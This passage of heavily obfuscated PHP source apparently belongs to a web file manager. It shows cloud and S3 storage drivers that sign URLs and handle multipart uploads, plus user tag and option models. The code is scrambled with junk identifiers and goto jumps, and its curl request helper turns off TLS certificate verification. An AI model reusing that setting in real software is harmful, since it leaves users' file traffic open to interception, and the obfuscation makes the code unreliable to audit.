(strlen($FÒé£ÒÖÜ) < $cõ‰½Àè†ô) { break; } } fclose($Eæ³º¶ßâ£); return $cŠ…êôß­; goto fÓ‰÷¾­ãĞ; fÓ¥­ŠÍƒÂ: $A§ø‹øğ¼ =& $_SERVER[°Óó£ÌİóèÅ]; $e„‘…„Ñò… = IO::getPathInner(IO::mkfile($cŠ…êôß­)); if (!($bÓº²´¨« = $this->link($B”›–Å½À›))) { return !1; } goto dÜï¿Ğæ…‰; dÜï¿Ğæ…‰: $d‹ªö„‡ô„ = 0; $cõ‰½Àè†ô = 1024 * 200; $Eæ³º¶ßâ£ = fopen($e„‘…„Ñò…, $A§ø‹øğ¼[962]); goto Dİ¡®“Ì­; fÓ‰÷¾­ãĞ: } public function link($C„à™ä·Áø, $C„¿¹ù ® = '') { if (!$this->isFile($C„à™ä·Áø)) { return !1; } $BÕ’—ØĞì± = $this->getHost() . $_SERVER[°Óó£ÌİóèÅ][8] . $this->pathEncode($C„à™ä·Áø) . $C„¿¹ù ®; return $this->auth->privateDownloadUrl($BÕ’—ØĞì±, 3600 * 12); } public function fileOut($d§ñƒÖö , $a±Ú¾ö”Şã = false, $FÖÆ‘†ãí = false, $d²’‘ÔâÓÉ = '') { $a´éè›ÑÒÜ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$FÖÆ‘†ãí) { $FÖÆ‘†ãí = $this->pathThis($d§ñƒÖö ); } $f©ëàğÙÏĞ = $a±Ú¾ö”Şã ? $a´éè›ÑÒÜ[963] . rawurlencode($FÖÆ‘†ãí) : $a´éè›ÑÒÜ[33]; $eÎŠ‹˜‹‘¸ = $this->link($d§ñƒÖö , $f©ëàğÙÏĞ); $this->fileOutLink($eÎŠ‹˜‹‘¸); } public function fileOutServer($d÷¥ö™°–š, $cÛ•îÓ² = false, $AÃÙ­¨›Ü˜ = false, $dËö´å³ßµ = '') { parent::fileOut($d÷¥ö™°–š, $cÛ•îÓ², $AÃÙ­¨›Ü˜, $dËö´å³ßµ); } public function fileOutImage($D«ÁôÏŒÛŸ, $D§ì ç‰ÕÎ = 250) { $FÒÔ„óÔÀ = $this->link($D«ÁôÏŒÛŸ, $_SERVER[°Óó£ÌİóèÅ][964] . $D§ì ç‰ÕÎ); $this->fileOutLink($FÒÔ„óÔÀ); } public function fileOutImageServer($e’‡õùÂÖÍ, $BÒäº³ì”™ = 250) { parent::fileOutImage($e’‡õùÂÖÍ, $BÒäº³ì”™); } public function fileOutLink($e¢…Õ„Ñß¤) { header($_SERVER[°Óó£ÌİóèÅ][161] . $e¢…Õ„Ñß¤); die; } public function hashMd5($B—‰‰’­¨) { $cÇ‰‚ïÜóÙ =& $_SERVER[°Óó£ÌİóèÅ]; $c‹ºˆöˆŞË = $this->link($B—‰‰’­¨, $cÇ‰‚ïÜóÙ[965]); $eŠé¶¡÷™É = $this->qnRequest($c‹ºˆöˆŞË, array(), !0); return !isset($eŠé¶¡÷™É[$cÇ‰‚ïÜóÙ[205]]) ? !1 : $eŠé¶¡÷™É[$cÇ‰‚ïÜóÙ[205]]; } private function fileInfoImage($F¾ôÀÇ²Ô«, &$dŠ½îÎÚ®) { $dßÆ¸õ «ƒ =& $_SERVER[°Óó£ÌİóèÅ]; if (!in_array($dŠ½îÎÚ®[$dßÆ¸õ «ƒ[165]], array($dßÆ¸õ «ƒ[216], $dßÆ¸õ «ƒ[166], $dßÆ¸õ «ƒ[217], $dßÆ¸õ «ƒ[218], $dßÆ¸õ «ƒ[219]))) { return; } if (!($c”ù©êØ×¶ = $this->link($F¾ôÀÇ²Ô«, $dßÆ¸õ «ƒ[966]))) { return !1; } if (!($C¾¹ö½Œ‚ã = $this->qnRequest($c”ù©êØ×¶, array(), !0))) { return !1; } $dŠ½îÎÚ®[$dßÆ¸õ «ƒ[220]] = array($dßÆ¸õ «ƒ[221] => $C¾¹ö½Œ‚ã[$dßÆ¸õ «ƒ[221]], $dßÆ¸õ «ƒ[901] => $C¾¹ö½Œ‚ã[$dßÆ¸õ «ƒ[222]]); } public function qnRequest($c¬‰§Ë´³, $B»ÏâôÆÈë = array(), $D£Ùƒ ¼ø = false) { goto dµî×ßµ–å; dµî×ßµ–å: $a øçğÆ¸ƒ =& $_SERVER[°Óó£ÌİóèÅ]; $d»»¾‹íõ = curl_init(); curl_setopt($d»»¾‹íõ, CURLOPT_URL, $c¬‰§Ë´³); goto d½Ñ¾Êãì; d½Ñ¾Êãì: curl_setopt($d»»¾‹íõ, CURLOPT_RETURNTRANSFER, 1); curl_setopt($d»»¾‹íõ, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($d»»¾‹íõ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto AÌˆÙï»±Ş; AÌˆÙï»±Ş: curl_setopt($d»»¾‹íõ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($d»»¾‹íõ, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($d»»¾‹íõ, CURLOPT_NOPROGRESS, !1); goto d«Ê‚Àğ¶¼; e“æÍ…–Ÿ: curl_close($d»»¾‹íõ); if ($D£Ùƒ ¼ø) { return @json_decode($E†ÀÉš¯Ğ , !0); } return $E†ÀÉš¯Ğ ; goto Fò¬¾‚ŸÄ‚; Cõ×ÙÅ‘…: curl_setopt($d»»¾‹íõ, CURLOPT_FOLLOWLOCATION, 1); $E†ÀÉš¯Ğ  = curl_exec($d»»¾‹íõ); curl_progress_end($d»»¾‹íõ); goto e“æÍ…–Ÿ; d«Ê‚Àğ¶¼: curl_setopt($d»»¾‹íõ, CURLOPT_PROGRESSFUNCTION, $a øçğÆ¸ƒ[967]); curl_progress_start($d»»¾‹íõ); if (isset($B»ÏâôÆÈë[$a øçğÆ¸ƒ[920]]) && $B»ÏâôÆÈë[$a øçğÆ¸ƒ[336]] > 0) { $bÎ©‘¨¹ºì = $B»ÏâôÆÈë[$a øçğÆ¸ƒ[920]]; $D×ÒÛ‡£Ÿ¬ = $B»ÏâôÆÈë[$a øçğÆ¸ƒ[920]] + ($B»ÏâôÆÈë[$a øçğÆ¸ƒ[336]] - 1); curl_setopt($d»»¾‹íõ, CURLOPT_RANGE, "{$bÎ©‘¨¹ºì}\x2d{$D×ÒÛ‡£Ÿ¬}"); } goto Cõ×ÙÅ‘…; Fò¬¾‚ŸÄ‚: } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Cä¤İ—ƒ‚©) { parent::__construct($Cä¤İ—ƒ‚©); } public function uploadFormData($fĞïîè÷ë, $Eî™á«¹Õ™ = 3600) { goto cÛ‹ÁĞ¥½ğ; Dòî»ß’ñù: $dÈÔÙÙ™‰ó = array($this->accessKey, $Aœ©¹×é¶, $this->region, $C»™Ïë‡£ò, $D±Š¿ø˜ÒÍ); $D´§³éğŞ = implode($AÂÕîîöÕ[8], $dÈÔÙÙ™‰ó); $E„§©ÚÎ’» = array($AÂÕîîöÕ[839] => gmdate($AÂÕîîöÕ[838], strtotime($AÂÕîîöÕ[870])), $AÂÕîîöÕ[840] => array(array($AÂÕîîöÕ[842] => $this->bucket), array($AÂÕîîöÕ[841] => $dŠ¡–Œ£Õ), array($AÂÕîîöÕ[843], $AÂÕîîöÕ[844], $AÂÕîîöÕ[33]), array($AÂÕîîöÕ[843], $AÂÕîîöÕ[871], $AÂÕîîöÕ[33]), array($AÂÕîîöÕ[843], $AÂÕîîöÕ[872], $AÂÕîîöÕ[33]), array($AÂÕîîöÕ[845] => $F¸¤Æõ¸Ú¢), array($AÂÕîîöÕ[873] => $D´§³éğŞ), array($AÂÕîîöÕ[874] => $a†Á£¢—), array($AÂÕîîöÕ[875] => $Cƒ˜®©î¤à), array($AÂÕîîöÕ[876] => $CÍ´©Óï—¨))); goto dÅƒÌÂğŞÍ; cÛ‹ÁĞ¥½ğ: $AÂÕîîöÕ =& $_SERVER[°Óó£ÌİóèÅ]; $dŠ¡–Œ£Õ = $AÂÕîîöÕ[190]; $a†Á£¢— = $AÂÕîîöÕ[867]; goto eÕÖËÄ‘ßë; b§Ó¤—£ˆ: $Eã Ìø½á‚ = hash_hmac($AÂÕîîöÕ[877], $C»™Ïë‡£ò, $e”æŒÇãÚ½, !0); $aŒÓÄŠ§‘ = hash_hmac($AÂÕîîöÕ[877], $D±Š¿ø˜ÒÍ, $Eã Ìø½á‚, !0); $fÏğÛš‹› = hash_hmac($AÂÕîîöÕ[877], $EƒİÆ¹ê¢ß, $aŒÓÄŠ§‘); goto AŒŠ¹Òø˜Ş; AŒŠ¹Òø˜Ş: $aª•æõì–ç = array($AÂÕîîöÕ[207] => $AÂÕîîöÕ[33], $AÂÕîîöÕ[879] => $AÂÕîîöÕ[33], $AÂÕîîöÕ[841] => $dŠ¡–Œ£Õ, $AÂÕîîöÕ[845] => $F¸¤Æõ¸Ú¢, $AÂÕîîöÕ[849] => $EƒİÆ¹ê¢ß, $AÂÕîîöÕ[880] => $D´§³éğŞ, $AÂÕîîöÕ[881] => $a†Á£¢—, $AÂÕîîöÕ[882] => $Cƒ˜®©î¤à, $AÂÕîîöÕ[883] => $CÍ´©Óï—¨, $AÂÕîîöÕ[884] => $fÏğÛš‹›, $AÂÕîîöÕ[174] => $this->getHost()); return $aª•æõì–ç; goto cé¨¿İ¸Á‘; dÅƒÌÂğŞÍ: $EƒİÆ¹ê¢ß = base64_encode(json_encode($E„§©ÚÎ’»)); $e°ØåîÉÉÔ = hash_hmac($AÂÕîîöÕ[877], $Aœ©¹×é¶, $AÂÕîîöÕ[878] . $this->secret, !0); $e”æŒÇãÚ½ = hash_hmac($AÂÕîîöÕ[877], $this->region, $e°ØåîÉÉÔ, !0); goto b§Ó¤—£ˆ; c“ÃÓ—‘‚Õ: $D±Š¿ø˜ÒÍ = $AÂÕîîöÕ[869]; $CÍ´©Óï—¨ = $Eî™á«¹Õ™ . $AÂÕîîöÕ[33]; $F¸¤Æõ¸Ú¢ = $AÂÕîîöÕ[837]; goto Dòî»ß’ñù; eÕÖËÄ‘ßë: $C»™Ïë‡£ò = $AÂÕîîöÕ[67]; $Cƒ˜®©î¤à = gmdate($AÂÕîîöÕ[868]); $Aœ©¹×é¶ = gmdate($AÂÕîîöÕ[455]); goto c“ÃÓ—‘‚Õ; cé¨¿İ¸Á‘: } public function multiUploadFormData($C¿Öˆ«ğù“, $d¢Å±â» = 3600) { $a‘Ë„¸»¨õ =& $_SERVER[°Óó£ÌİóèÅ]; $eãØ¢İĞÂ„ = gmdate($a‘Ë„¸»¨õ[968]); $a¥¨Üòğ = array(); $c¿É·Ï¡ßî = $this->client->getUploadId($this->bucket, $C¿Öˆ«ğù“, $a¥¨Üòğ); if (!$c¿É·Ï¡ßî) { return !1; } return array($a‘Ë„¸»¨õ[224] => $c¿É·Ï¡ßî, $a‘Ë„¸»¨õ[174] => $this->getHost() . $a‘Ë„¸»¨õ[8] . $this->pathEncode($C¿Öˆ«ğù“), $a‘Ë„¸»¨õ[225] => $eãØ¢İĞÂ„, $a‘Ë„¸»¨õ[96] => $C¿Öˆ«ğù“); } public function multiUploadAuthData($a¿ïâ§Àé, $eÉ¹ÕØ²Û¾ = array()) { goto eƒ‰´Œ¤É±; Eƒ¡î¿çÔŞ: unset($eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[96]]); if (isset($eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[226]])) { return $this->listUploadParts($b‹ß»´Ìî³, $eÉ¹ÕØ²Û¾); } $b†ò¹’§¸³ = array(); goto C«ø„‰ô»; f»«èÀŒæ: if (strpos($C¡·¡¾åÂæ, $f´»Ëô¾œˆ[228]) === 0) { if (isset($b†ò¹’§¸³[$f´»Ëô¾œˆ[970]])) { $aÔµŠÖè = $b†ò¹’§¸³[$f´»Ëô¾œˆ[970]]; } else { if (isset($D‹ˆáæ‚Ëç[$f´»Ëô¾œˆ[970]])) { $aÔµŠÖè = $D‹ˆáæ‚Ëç[$f´»Ëô¾œˆ[970]]; } else { $aÔµŠÖè = hash($f´»Ëô¾œˆ[877], $f´»Ëô¾œˆ[33]); } } return array($f´»Ëô¾œˆ[234] => $D‹ˆáæ‚Ëç[$f´»Ëô¾œˆ[234]], $f´»Ëô¾œˆ[970] => $aÔµŠÖè, $f´»Ëô¾œˆ[225] => $D‹ˆáæ‚Ëç[$f´»Ëô¾œˆ[973]]); } return $D‹ˆáæ‚Ëç[$f´»Ëô¾œˆ[234]]; goto E®¨²ËèÎ; C«ø„‰ô»: if (isset($eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[969]])) { $b†ò¹’§¸³[$f´»Ëô¾œˆ[970]] = $eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[969]]; } $DçÛÖ‘º· = explode($f´»Ëô¾œˆ[176], $this->getHost()); $CŸæ‡Œåî† = array($f´»Ëô¾œˆ[971] => $DçÛÖ‘º·[1], $f´»Ëô¾œˆ[972] => $f´»Ëô¾œˆ[33], $f´»Ëô¾œˆ[207] => $f´»Ëô¾œˆ[123], $f´»Ëô¾œˆ[879] => $eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[86]]); goto c¯…Á´½³ß; eƒ‰´Œ¤É±: $f´»Ëô¾œˆ =& $_SERVER[°Óó£ÌİóèÅ]; $C¡·¡¾åÂæ = isset($eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[165]]) ? $eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[165]] : $f´»Ëô¾œˆ[33]; $b‹ß»´Ìî³ = $eÉ¹ÕØ²Û¾[$f´»Ëô¾œˆ[96]]; goto Eƒ¡î¿çÔŞ; c¯…Á´½³ß: $E—ïé¸ø•† = $f´»Ëô¾œˆ[229]; $dÓÏÉ®ÅÖÍ = $f´»Ëô¾œˆ[8] . $this->pathEncode($b‹ß»´Ìî³) . $C¡·¡¾åÂæ; $D‹ˆáæ‚Ëç = $this->client->__getSignatureV4($b†ò¹’§¸³, $CŸæ‡Œåî†, $E—ïé¸ø•†, $dÓÏÉ®ÅÖÍ); goto f»«èÀŒæ; E®¨²ËèÎ: } public function listUploadParts($fÑ°…ÆˆÉ¤, $cŞ„„ÒÈ·† = array()) { goto FŠ¾ËŞ¢ƒÈ; DíŒå…¿½Û: $e¾çá¡•±ø .= $d·©Î†¹œÀ[977]; $D®ºœóÉó„ = array(); $bê½Ñ´‘ôñ = explode($d·©Î†¹œÀ[176], $this->getHost()); goto dõå£š†Ô; aöÒÀëï®: $C…Â“™˜¡ = $this->client->__getSignatureV4($D®ºœóÉó„, $Cîâµ‚ÎÑÇ, $C™Õ…ƒÙÊ‹, $F²ºì¹Ï‡½, $e¾çá¡•±ø); return array($d·©Î†¹œÀ[234] => $C…Â“™˜¡[$d·©Î†¹œÀ[234]], $d·©Î†¹œÀ[225] => $C…Â“™˜¡[$d·©Î†¹œÀ[973]], $d·©Î†¹œÀ[236] => $B«È’…˜‡, $d·©Î†¹œÀ[970] => $C…Â“™˜¡[$d·©Î†¹œÀ[970]]); goto CåªŠãïÏ; FŠ¾ËŞ¢ƒÈ: $d·©Î†¹œÀ =& $_SERVER[°Óó£ÌİóèÅ]; $fäÈæøÎß = str_replace($d·©Î†¹œÀ[235], $d·©Î†¹œÀ[33], $cŞ„„ÒÈ·†[$d·©Î†¹œÀ[165]]); $B«È’…˜‡ = $this->client->listParts($this->bucket, $fÑ°…ÆˆÉ¤, $fäÈæøÎß); goto a­î…²ò¿…; a­î…²ò¿…: if (!$B«È’…˜‡) { return !1; } $e¾çá¡•±ø = $d·©Î†¹œÀ[974]; foreach ($B«È’…˜‡ as $CĞÔ˜ùÓ”ª) { $e¾çá¡•±ø .= $d·©Î†¹œÀ[975] . "\74\120\x61\x72\164\x4e\165\155\x62\145\162\76{$CĞÔ˜ùÓ”ª[$d·©Î†¹œÀ[922]]}\74\x2f\x50\141\162\164\116\165\155\142\145\162\76\xa" . "\x3c\105\x54\141\147\76{$CĞÔ˜ùÓ”ª[$d·©Î†¹œÀ[923]]}\74\x2f\x45\124\x61\147\76\12" . $d·©Î†¹œÀ[976]; } goto DíŒå…¿½Û; dõå£š†Ô: $Cîâµ‚ÎÑÇ = array($d·©Î†¹œÀ[971] => $bê½Ñ´‘ôñ[1], $d·©Î†¹œÀ[207] => $d·©Î†¹œÀ[123], $d·©Î†¹œÀ[879] => strlen($e¾çá¡•±ø)); $C™Õ…ƒÙÊ‹ = $d·©Î†¹œÀ[227]; $F²ºì¹Ï‡½ = $d·©Î†¹œÀ[8] . $this->pathEncode($fÑ°…ÆˆÉ¤) . $cŞ„„ÒÈ·†[$d·©Î†¹œÀ[165]]; goto aöÒÀëï®; CåªŠãïÏ: } public function link($E¬ïê‹á”‚, $d‚ÚôÊ›áİ = array()) { return parent::link($E¬ïê‹á”‚, $d‚ÚôÊ›áİ); } public function fileOut($Fê½¿ĞêÛõ, $c›ÉÀ§ğ†² = false, $CäËÂ÷¶Ù‰ = false, $b•¯×’¡¥× = '') { if (strstr($this->endpoint, $_SERVER[°Óó£ÌİóèÅ][978])) { return parent::fileOutServer($Fê½¿ĞêÛõ, $c›ÉÀ§ğ†², $CäËÂ÷¶Ù‰, $b•¯×’¡¥×); } parent::fileOut($Fê½¿ĞêÛõ, $c›ÉÀ§ğ†², $CäËÂ÷¶Ù‰, $b•¯×’¡¥×); } public function fileOutImage($FÒ«¨ÏËŒ‹, $F”ôí¬íƒÇ = 250) { if (strstr($this->endpoint, $_SERVER[°Óó£ÌİóèÅ][978])) { return parent::fileOutImageServer($FÒ«¨ÏËŒ‹, $F”ôí¬íƒÇ); } parent::fileOutImage($FÒ«¨ÏËŒ‹, $F”ôí¬íƒÇ); } public function fileInfoImage($CíÓáÒ© , &$dÓÇÉŠ¥®) { $d¹®â³ø =& $_SERVER[°Óó£ÌİóèÅ]; $A°÷¼¸ÛĞò = array($d¹®â³ø[216], $d¹®â³ø[166], $d¹®â³ø[217], $d¹®â³ø[218], $d¹®â³ø[219]); if (!in_array($dÓÇÉŠ¥®[$d¹®â³ø[165]], $A°÷¼¸ÛĞò)) { return; } if (!strstr($this->endpoint, $d¹®â³ø[978])) { $aöˆ³Æ»ÒÈ = $this->link($CíÓáÒ© ); $cÖ¥èØ‹© = getimagesize($aöˆ³Æ»ÒÈ); if ($cÖ¥èØ‹©) { $dÓÇÉŠ¥®[$d¹®â³ø[220]] = array($d¹®â³ø[221] => $cÖ¥èØ‹©[0], $d¹®â³ø[222] => $cÖ¥èØ‹©[1]); } } } public function getHost() { $Eƒö›“Ó =& $_SERVER[°Óó£ÌİóèÅ]; $fÓ˜ßß…¿ó = rtrim(parent::getHost(), $Eƒö›“Ó[8] . $this->bucket); $fÓ˜ßß…¿ó = explode($Eƒö›“Ó[176], $fÓ˜ßß…¿ó); return $fÓ˜ßß…¿ó[0] . $Eƒö›“Ó[176] . $this->bucket . $Eƒö›“Ó[100] . $fÓ˜ßß…¿ó[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($có±ßâ¨³–, $cÙ¹—«Ç†ê = 0) { parent::__construct(); $this->source = $có±ßâ¨³–; $this->sourceSize = $cÙ¹—«Ç†ê; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($bÍêº¹ä‚½ = false) { return $this->sourceSize; } public function getContent($DËÛÜ«‘œİ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $EÛñí‡İÄ = ftell($this->source); $Eù¡Öâˆä = @fread($this->source, $this->sourceSize); fseek($this->source, $EÛñí‡İÄ); return $Eù¡Öâˆä; } } public function fileSubstr($DÜíƒ„óÌé = false, $dåòäÚ‹¬ = 0, $bÚÆ˜ÜÓÎ« = 0) { if (!$bÚÆ˜ÜÓÎ«) { $bÚÆ˜ÜÓÎ« = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $dåòäÚ‹¬, $bÚÆ˜ÜÓÎ«); } if ($this->sourceType == self::TYPE_FILE) { $aœù×İ±¸ = ftell($this->source); fseek($this->source, $aœù×İ±¸ + $dåòäÚ‹¬); $F³ª³®á = @fread($this->source, $bÚÆ˜ÜÓÎ«); fseek($this->source, $aœù×İ±¸); return $F³ª³®á; } } public function hashMd5($fí·œ°¦óŠ = false) { return md5($this->getContent()); } public static function hash($A¼Ñ¯Í˜ä¶, $dÁ¬•ç† = 0) { $F»Ãöñ•Ñƒ = new PathDriverStream($A¼Ñ¯Í˜ä¶, $dÁ¬•ç†); return $F»Ãöñ•Ñƒ->hashSimple($A¼Ñ¯Í˜ä¶); } public static function md5($AŒÚÊšà«¿, $FÔÙòòó¸¶ = 0) { $DÚÍ¾©ï‚¬ = new PathDriverStream($AŒÚÊšà«¿, $FÔÙòòó¸¶); return $DÚÍ¾©ï‚¬->hashMd5($AŒÚÊšà«¿); } } goto EÚ–‘¾¦î; A´ÎÓÍ‡ÅÒ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\x6f\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cºèÙÔ——š) { return "\x55\x73\145\x72\x4f\160\164\x69\157\x6e\x5f{$cºèÙÔ——š}\x5f" . USER_ID; } protected function filterWhere($FªØ ğÛÛŠ) { $FªØ ğÛÛŠ[$_SERVER[°Óó£ÌİóèÅ][1095]] = USER_ID; return $FªØ ğÛÛŠ; } public function cacheRemoveUser($E˜Áïì˜‰, $CäÑßâÄö) { return Cache::remove("\x55\x73\145\162\x4f\x70\164\x69\157\156\137{$E˜Áïì˜‰}\x5f" . $CäÑßâÄö); } public function get($aÅ™¡«åÆ– = false, $BÒøÈĞˆ©Œ = '', $d…Ê—°‹ƒ = false) { goto d¶í³Î¢ã; EÌäøøìï: global $config; $A¹Ø„Ñ“ï” = array($câÂÛ÷¢©[33] => $câÂÛ÷¢©[1970], $câÂÛ÷¢©[1971] => $câÂÛ÷¢©[1972]); $AÓä´ƒ¡Íš = $config[$A¹Ø„Ñ“ï”[$BÒøÈĞˆ©Œ]]; goto AÙ‘¤‘¼ø; d¶í³Î¢ã: $câÂÛ÷¢© =& $_SERVER[°Óó£ÌİóèÅ]; $c¥ÒùìÔ‚ = parent::get($aÅ™¡«åÆ–, $BÒøÈĞˆ©Œ, $d…Ê—°‹ƒ); if (!is_null($c¥ÒùìÔ‚)) { return $c¥ÒùìÔ‚; } goto EÌäøøìï; AÙ‘¤‘¼ø: if (!$aÅ™¡«åÆ–) { return $AÓä´ƒ¡Íš; } else { return $AÓä´ƒ¡Íš[$aÅ™¡«åÆ–]; } goto fïÌ•³¤Ää; fïÌ•³¤Ää: } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\x74\141\147\x4c\151\163\164"; public $modelType = "\x55\x73\145\x72\117\x70\x74\x69\x6f\156"; public $field = array("\x6e\141\155\145", "\163\164\171\x6c\x65", "\x73\157\162\164"); public function listData($cÍæòğÓÅ¸ = false, $Dæ–­Ø‘¹ = "\x73\x6f\x72\x74", $fñ²†Â²ôî = false) { return parent::listData($cÍæòğÓÅ¸, $Dæ–­Ø‘¹, $fñ²†Â²ôî); } public function remove($B«•Ø˜‰«è) { return parent::remove($B«•Ø˜‰«è); } public function add($a’¶Á¦ºæî, $Fƒ‹¤›×œ¤ = "\154\141\x62\145\154\x2d\147\162\145\x79\55\x6e\x6f\x72\155\141\x6c") { $DİÔ­ê¨¼‚ =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->findByName($a’¶Á¦ºæî)) { return !1; } $cºÊôŠç = array($DİÔ­ê¨¼‚[395] => $a’¶Á¦ºæî, $DİÔ­ê¨¼‚[1973] => $Fƒ‹¤›×œ¤, $DİÔ­ê¨¼‚[1550] => $this->getSort($DİÔ­ê¨¼‚[257]) + 1); return parent::insert($cºÊôŠç); } public function update($cÄÙ·â×ÓŒ, $CÈÀ©’ÈÜ¬) { $c†…²ë‡øÊ =& $_SERVER[°Óó£ÌİóèÅ]; $fŠ÷—³šÃ£ = $this->listData($cÄÙ·â×ÓŒ); $b»öÌÑÏ‚à = $this->findByName($CÈÀ©’ÈÜ¬[$c†…²ë‡øÊ[28]]); if (!$fŠ÷—³šÃ£ || $b»öÌÑÏ‚à && $b»öÌÑÏ‚à[$c†…²ë‡øÊ[376]] != $fŠ÷—³šÃ£[$c†…²ë‡øÊ[376]]) { return !1; } return parent::update($cÄÙ·â×ÓŒ, $CÈÀ©’ÈÜ¬); } public function moveTop($D½µ·à™¶²) { $e˜Ì®‚Ø‡‘ =& $_SERVER[°Óó£ÌİóèÅ]; $bóøÄ‹¢‡× = parent::listData(); $Eäİ•ªäÒ¼ = $this->getSort($e˜Ì®‚Ø‡‘[256]); foreach ($bóøÄ‹¢‡× as &$C µ—ÛÓ­ô) { if ($C µ—ÛÓ­ô[$e˜Ì®‚Ø‡‘[376]] == $D½µ·à™¶²) { $C µ—ÛÓ­ô[$e˜Ì®‚Ø‡‘[1567]] = $Eäİ•ªäÒ¼; continue; } $C µ—ÛÓ­ô[$e˜Ì®‚Ø‡‘[1567]] += 1; } return parent::resetData($bóøÄ‹¢‡×); } public function moveBottom($AöªìÀÜ¨æ) { $bàµÛæÜ—î =& $_SERVER[°Óó£ÌİóèÅ]; $cöÁ­« = $this->getSort($bàµÛæÜ—î[257]) + 1; return parent::update($AöªìÀÜ¨æ, array($bàµÛæÜ—î[1567] => $cöÁ­«)); } public function resetSort($DÆŸ…¨Ô) { $A‰ÙõÖÜ„Š =& $_SERVER[°Óó£ÌİóèÅ]; $A’ªÙÜÁÏ = array(); for ($Aİî®Å·ƒ’ = 0; $Aİî®Å·ƒ’ < count($DÆŸ…¨Ô); $Aİî®Å·ƒ’++) { $A’ªÙÜÁÏ[$DÆŸ…¨Ô[$Aİî®Å·ƒ’] . $A‰ÙõÖÜ„Š[33]] = $Aİî®Å·ƒ’ + 1; } $CÜÑ›¢®ªß = parent::listData(); foreach ($CÜÑ›¢®ªß as &$e™µÕ¤ˆ¢ä) { $CŞƒÄÙæ±‘ = $A’ªÙÜÁÏ[$e™µÕ¤ˆ¢ä[$A‰ÙõÖÜ„Š[376]]]; $e™µÕ¤ˆ¢ä[$A‰ÙõÖÜ„Š[1567]] = $CŞƒÄÙæ±‘ ? $CŞƒÄÙæ±‘ : $e™µÕ¤ˆ¢ä[$A‰ÙõÖÜ„Š[1567]]; } return parent::resetData($CÜÑ›¢®ªß); } private function getSort($DÚñàìÆ½) { $eÜÃÇâàíÌ =& $_SERVER[°Óó£ÌİóèÅ]; $DÕµ¿öà¸ = parent::listData(); $Eó”¢‡ß¸Î = array_to_keyvalue($DÕµ¿öà¸, $eÜÃÇâàíÌ[33], $eÜÃÇâàíÌ[1567]); if (!$Eó”¢‡ß¸Î) { $Eó”¢‡ß¸Î = array(0); } $f»º‡˜Òê‹ = $DÚñàìÆ½ == $eÜÃÇâàíÌ[257] ? max($Eó”¢‡ß¸Î) : min($Eó”¢‡ß¸Î); return intval($f»º‡˜Òê‹); } } class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($e¨´Äå“ÒÙ) { $Aß£¨« =& $_SERVER[°Óó£ÌİóèÅ]; return array($Aß£¨«[1909] => array(USER_ID, $Aß£¨«[1974])); } protected function listData() { $c¡ÈùÒ¬­† =& $_SERVER[°Óó£ÌİóèÅ]; $Aİù¦£’Ş = array($c¡ÈùÒ¬­†[1086] => USER_ID, $c¡ÈùÒ¬­†[1911] => array($c¡ÈùÒ¬­†[1975], 0)); $EÖğ¿ğÄ™‡ = $c¡ÈùÒ¬­†[1976]; $bùÔ×ù‡Ã = $c¡ÈùÒ¬­†[1977]; $e£äèèîƒß = $this->field($EÖğ¿ğÄ™‡)->where($Aİù¦£’Ş)->order($bùÔ×ù‡Ã)->select(); return $e£äèèîƒß ? $e£äèèîƒß : array(); } protected function listByTag($AäÏÉ¿èŞ) { } protected function addToTag($d¹âóÂ‘™§, $Aš¤¹˜ªÄ‹) { $b¡§öïŞ’¾ =& $_SERVER[°Óó£ÌİóèÅ]; if (!Model($b¡§öïŞ’¾[1745])->listData($Aš¤¹˜ªÄ‹) || !Model($b¡§öïŞ’¾[529])->pathInfo($d¹âóÂ‘™§)) { return !1; } $Cå‚¶˜ÚãÕ = array($b¡§öïŞ’¾[1086] => USER_ID, $b¡§öïŞ’¾[1911] => $Aš¤¹˜ªÄ‹, $b¡§öïŞ’¾[1608] => $d¹âóÂ‘™§, $b¡§öïŞ’¾[812] => $b¡§öïŞ’¾[983], $b¡§öïŞ’¾[395] => $b¡§öïŞ’¾[33], $b¡§öïŞ’¾[1550] => 0); if ($this->where($Cå‚¶˜ÚãÕ)->find()) { return !1; } return $this->add($Cå‚¶˜ÚãÕ); } protected function removeFromTag($cÖÓè·ìŸ­, $Bˆªƒ¶àœ‰) { $aäóƒÖì =& $_SERVER[°Óó£ÌİóèÅ]; if (!Model($aäóƒÖì[1745])->listData($Bˆªƒ¶àœ‰) || !Model($aäóƒÖì[529])->pathInfo($cÖÓè·ìŸ­)) { return !1; } $B‹Ú“¼í‡ = array($aäóƒÖì[1086] => USER_ID, $aäóƒÖì[1911] => $Bˆªƒ¶àœ‰, $aäóƒÖì[812] => $aäóƒÖì[983], $aäóƒÖì[1608] => $cÖÓè·ìŸ­); return $this->where($B‹Ú“¼í‡)->delete(); } protected function removeByTag($A‰†ºäáÛÖ) { $fîí÷†½ÅÑ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$A‰†ºäáÛÖ) { return !1; } $dÅ·É……Ø‰ = array($fîí÷†½ÅÑ[1086] => USER_ID, 